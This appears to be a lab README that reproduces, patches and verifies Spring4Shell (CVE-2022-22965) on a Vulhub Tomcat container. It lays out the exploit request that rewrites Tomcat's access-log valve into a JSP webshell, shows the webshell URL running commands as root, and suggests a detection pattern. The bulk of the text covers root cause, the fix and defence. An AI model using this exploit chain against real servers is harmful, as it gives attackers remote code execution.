# CVE-2022-22965 — Spring4Shell

The vulnerable-environment half of Work 1: launcher, exploit, patch and
verification for the CVE chosen for this work.

| Property | Value |
|---|---|
| CVE | **CVE-2022-22965** ("Spring4Shell") |
| Component | Spring Framework MVC data binding, WAR deployment on Tomcat, JDK 9+ |
| Class | CWE-94 — Improper Control of Generation of Code ("Code Injection") |
| CVSS 3.1 | **9.8 CRITICAL** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Affected | Spring 5.3.0–5.3.17, 5.2.0–5.2.19 |
| Fixed in | Spring 5.3.18 / 5.2.20 (2022-03-31) |
| OWASP Top 10 | A03:2021 Injection, A06:2021 Vulnerable and Outdated Components |
| Vulhub path | `vulhub/spring/CVE-2022-22965` |

---

## 1. Why this CVE

* The root cause is a **design flaw in a framework feature**, not a missing
  check in one application: every Spring MVC app that binds a model attribute
  inherits it.
* The exploit is a **single HTTP request** — no payload file, no brute force —
  and the result (a JSP webshell) is unambiguous.
* The fix is a **framework upgrade**, which is exactly the "change the version
  in docker-compose" remediation the lab asks for.
* The failure mode after the fix is easy to misread: the patched server answers
  `200`, not `4xx`, so verification has to be behavioural.

---

## 2. Files

```
cve/
├── docker-compose.yml          # vulnerable: vulhub/spring-webmvc:5.3.17, port 8080
├── Dockerfile.fixed            # same app, Spring jars 5.3.18
├── docker-compose.fixed.yml    # patched target, same port
├── exploit.ps1 / exploit.sh    # baseline → exploit → webshell → id/whoami
├── verify-fix.ps1 / verify-fix.sh  # behaviour checks + regression
├── README.md                   # this file
└── ../docs/evidence/           # captured transcripts
```

The vulnerable image is the stock Vulhub image (`vulhub/spring-webmvc:5.3.17`):
Spring MVC 5.3.17 packaged as `ROOT.war`, Tomcat 8.5.77, JDK 11. The WAR
deployment matters — see §4.

---

## 3. Launch and reproduce

```bash
cd cve
docker compose up -d            # first run pulls ~500 MB
# wait for Tomcat: 30-60 s on a cold start
curl -s 'http://127.0.0.1:8080/?name=Bob&age=25'
# <h2>Hello, my name is Bob, I am 25 years old.</h2>
```

```powershell
powershell -ExecutionPolicy Bypass -File .\exploit.ps1
```

```
1. Baseline: the application works normally
   <h2>Hello, my name is Bob, I am 25 years old.</h2>

2. Exploit: rewrite the Tomcat access-log valve into a JSP webshell
   HTTP 200

3. Trigger execution through the webshell: /tomcatwar.jsp?pwd=j&cmd=id
   uid=0(root) gid=0(root) groups=0(root)
   RCE CONFIRMED — the command output above was produced by the target process
   --- whoami ---
   root
```

### 3.1 The request, parameter by parameter

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=<JSP>&
     class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&
     ...directory=webapps/ROOT&
     ...prefix=tomcatwar&
     ...fileDateFormat=
```

The path `class.module.classLoader.resources.context.parent.pipeline.first`
walks from the bound object to the log valve:

| Segment | Reached object |
|---|---|
| `class` | `java.lang.Class` of the model attribute |
| `module` | the JDK 9+ `Module` |
| `classLoader` | Tomcat's `WebappClassLoaderBase` |
| `resources` | `WebResourceRoot` |
| `context` | `StandardContext` (the web application) |
| `parent` | `StandardHost` |
| `pipeline` | the host's `StandardPipeline` |
| `first` | `AccessLogValve` |

The four writable valve properties turn the access log into a JSP file, and
`pattern` supplies its content. The value is assembled at log time from headers
(`%{c1}i`, `%{c2}i`, `%{suffix}i`), which is why the payload is not a literal
`<% %>` block in the URL:

* `c1: Runtime`, `c2: <%`, `suffix: %>//`;
* `pattern` produces `<% if("j".equals(request.getParameter("pwd"))){ ... Runtime.getRuntime().exec(request.getParameter("cmd")) ... } %>//`.

`fileDateFormat=` is empty so the file has no date stamp and is reachable as
`tomcatwar.jsp`. Tomcat buffers access-log writes (128 KiB), hence the ~10 s
wait before the file has content and Jasper compiles it.

The same request against the patched server is ignored: no valve property
changes, no file is created.

---

## 4. Root cause

### 4.1 The defect

Spring MVC binds request parameters to a handler's model attribute:

```java
@RequestMapping("/")
public String hello(Person person, Model model) { ... }
```

Before 5.3.18, `CachedIntrospectionResults` exposes the JavaBeans `class`
property to that binder. From `Class` the attacker can navigate to `module`
(JDK 9+), the module's classloader, Tomcat's web resources, the context, the
host, its pipeline and the first valve. Each step is an ordinary getter; nothing
in the chain validates that the *request* should be allowed to set these
objects.

So the vulnerability is **not** "a missing authorisation check". It is a
capability that a data-binding feature should never have had: binding user input
to *class metadata and container internals*.

### 4.2 Why the WAR/Tomcat condition matters

* `resources.context.parent` is the servlet container's object graph. A Spring
  Boot fat jar still runs an embedded Tomcat, but its access-log valve is not
  the configured sink, so the public exploit does not apply the same way.
* The `module` step needs JDK 9+; on JDK 8 the chain is shorter and this exploit
  does not work.
* The application must bind a POJO without an allow-list. A `@RequestParam`
  handler, or a binder restricted to known fields, never walks the chain.

### 4.3 Impact chain

```
request with class.module.classLoader... 
  → bean binder walks container internals
    → AccessLogValve properties rewritten
      → access log written as webapps/ROOT/tomcatwar.jsp
        → request to /tomcatwar.jsp?pwd=j&cmd=id
          → Runtime.exec(cmd) as the Tomcat process user
```

In this container Tomcat runs as `root`, so the webshell returns
`uid=0(root)`. On a normal deployment it would be the `tomcat` service account —
still full control of the application, its database credentials and its files.

### 4.4 Why this is CWE-94 and CVSS 9.8

The attacker controls *code* (JSP) that the server later executes, so the
weakness is code injection rather than plain information disclosure. The CVSS
vector `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` reflects: reachable over the
network, no privileges, no user interaction, high confidentiality, integrity and
availability impact.

---

## 5. The fix

`Dockerfile.fixed` rebuilds the same application with the Spring jars upgraded
to **5.3.18**, the release that blocks binding to `class.*` (and `Class.*`,
`*.class.*`, `*.Class.*`). The base image has no `jar` tool, so the Dockerfile
unpacks `ROOT.war` into `webapps/ROOT` and replaces `WEB-INF/lib/spring-*.jar`;
Tomcat deploys the exploded directory.

```bash
docker compose down
docker compose -f docker-compose.fixed.yml up -d --build
```

Verify the deployed version inside the image:

```bash
docker exec spring4shell-fixed unzip -p \
  /usr/local/tomcat/webapps/ROOT/WEB-INF/lib/spring-webmvc-5.3.18.jar \
  META-INF/MANIFEST.MF | head -5
```

### 5.1 Why the upgrade is the right fix

The fix is in `CachedIntrospectionResults`: the binder no longer exposes the
`class` property, so the chain `class.module…` cannot be entered at all. This
removes the primitive instead of blocking one payload — the published exploit is
only one way to abuse it.

### 5.2 If an upgrade is impossible

Spring's advisory offered a workaround for applications that cannot upgrade:

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*");
}
```

That is a **compensating control**, not a fix: it has to be repeated in every
controller that binds a model attribute, and any new controller can forget it.
It is listed here to show why the framework upgrade is preferable.

### 5.3 What is *not* a fix

* Deleting the webshell — the next request recreates it.
* Disabling the access log — breaks auditing, and leaves the primitive intact.
* Blocking the literal string `class.module` in a WAF — trivial to vary the
  property path (e.g. `Class.module`, or other reachable graph nodes).
* Running Tomcat as a non-root user — good hardening, but the webshell still
  executes with the application's privileges.

### 5.4 Defence in depth

* Keep Spring and Tomcat patched; treat framework CVEs as first-class
  dependency work (SCA in CI).
* Never bind request parameters directly to container objects; use DTOs with
  explicit fields and `@InitBinder` allow-lists (default-deny).
* Run the servlet container as an unprivileged user with a read-only webroot.
* Put the application behind a WAF **and** keep the framework patched — the WAF
  is a speed bump, not the fix.
* Alert on requests containing `class.module.classLoader` in the access log.

---

## 6. Verification

```powershell
powershell -ExecutionPolicy Bypass -File .\verify-fix.ps1
```

```
1. Regression: the application still serves normal requests
GET /?name=Bob&age=25 -> HTTP 200
[PASS] normal request returns 200 and renders Bob, 25

2. Replay the exploit (Spring 5.3.18 ignores the class.* properties)
exploit request -> HTTP 200 (200 here means 'ignored', not 'exploited')

3. No webshell was written
GET /tomcatwar.jsp -> HTTP 404
[PASS] the JSP webshell does not exist (404)
[PASS] no *.jsp file in the exploded webroot

4. The access-log valve was not rewritten
last access-log line: 172.18.0.1 - - [...] "GET /?name=Regression&age=30 HTTP/1.1" 200 92
[PASS] the access log keeps the default pattern (request line, status, bytes)
[PASS] the log line does not contain JSP source

5. Binding of normal model properties still works
[PASS] argument binding for the normal model still works

RESULT: 6 passed, 0 failed
fix verified - all checks passed
```

### 6.1 Why the status code is not enough

A naive check — "the exploit request must return 400" — fails here: 5.3.18
silently ignores the unknown properties and returns `200` with the normal page.
The verification therefore asserts the *effects*:

1. no `tomcatwar.jsp` in the webroot and no `.jsp` created at all;
2. the access log still has the default pattern (checked from inside the
   container with `docker exec`), i.e. the valve was not rewritten;
3. the normal `name`/`age` binding still works — a regression check that would
   catch a "fix" that simply broke the binder.

---

## 7. References

* Spring advisory — <https://tanzu.vmware.com/security/cve-2022-22965>
* NVD — <https://nvd.nist.gov/vuln/detail/CVE-2022-22965>
* CWE-94 — <https://cwe.mitre.org/data/definitions/94.html>
* Vulhub — <https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965>
* LunaSec analysis — <https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/>
* Spring Framework 5.3.18 release notes — <https://github.com/spring-projects/spring-framework/releases/tag/v5.3.18>
